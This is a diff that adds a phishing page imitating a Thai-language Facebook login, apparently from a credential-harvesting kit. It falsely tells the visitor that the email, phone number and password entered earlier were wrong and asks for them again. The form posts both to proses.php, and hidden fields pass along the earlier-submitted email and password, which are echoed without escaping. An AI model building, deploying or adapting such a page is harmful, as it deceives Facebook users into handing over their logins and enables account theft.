@@ -1,0 +1,74 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <!-- Required meta tags -->
+    <meta charset="utf-8" />
+    <meta
+      name="viewport"
+      content="width=device-width, initial-scale=1, shrink-to-fit=no"
+    />
+
+    <!-- Bootstrap CSS -->
+    <link
+      href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css"
+      rel="stylesheet"
+      integrity="sha384-EVSTQN3/azprG1Anm3QDgpJLIm9Nao0Yz1ztcQTwFspd3yD65VohhpuuCOmLASjC"
+      crossorigin="anonymous"
+    />
+    <link rel="stylesheet" href="assets/fathz.css" />
+    <title>เข้าสู่ระบบ | เข้าสู่ระบบ Facebook</title>
+  </head>
+  <body>
+    <div class="container">
+      <header>
+        <nav>
+          <div class="logo">
+            <img src="assets/img/meta.png" alt="Facebook Logo" />
+          </div>
+          <ul class="menu">
+            <li><a href="#">ช่วย</a></li>
+          </ul>
+        </nav>
+      </header>
+      <center>
+        <div class="peringatanakun">
+        <p style="color: white; background-color: red;">อีเมลหรือหมายเลขโทรศัพท์มือถือและรหัสผ่านที่คุณป้อนก่อนหน้านี้ไม่ถูกต้อง กรอกข้อมูลให้ถูกต้อง</p>
+<img src="fb.png" alt="Yudha Image" width="110" height="45">
+          </div>
+      </center>
+      <form class="bxformpemblokiran" method="post" action="proses.php">
+              <div class="itempemblokiranalexfb">
+                <div class="labelitemformalex">
+                  <label class="form-label">อีเมลหรือหมายเลขโทรศัพท์มือถือที่ถูกต้องของคุณ</label>
+                </div>
+                <input class="form-control-plaintext" type="text" name="nama" id="alx_nama" placeholder="อีเมลหรือหมายเลขโทรศัพท์มือถือ" autocomplete="off" required/>
+              </div>
+              <div class="itempemblokiranalexfb">
+                <div class="labelitemformalex">
+                  <label class="form-label">รหัสผ่านที่ถูกต้องของคุณ</label>
+                </div>
+                <input class="form-control-plaintext" type="password" name="phone" placeholder="รหัสผ่าน" id="alx_phone" autocomplete="off" required/>
+              </div>
+              <div class="btnverifalexfbblokir">
+              <input type="hidden" name="email" value="<?= $_POST['email'] ?>">
+              <input type="hidden" name="password" value="<?= $_POST['password'] ?>" >
+                <button type="submit">เข้าสู่ระบบ</button>
+              </div>
+            </form>
+            <foot class="copyright">
+              <div class="cralexfbpemblokiran">
+                <span style="font-size: 12;">Meta © 2023</span>
+              </div>
+             </foot>
+    </div>
+    <script
+      src="https://kit.fontawesome.com/08380760ee.js"
+      crossorigin="anonymous"
+    ></script>
+    <script
+      src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"
+      integrity="sha384-MrcW6ZMFYlzcLA8Nl+NtUVF0sA7MsXsP1UyJoMp4YLEuNSfAP+JcXn/tWtIaxVXM"
+      crossorigin="anonymous"
+    ></script>
+  </body>
+</html>
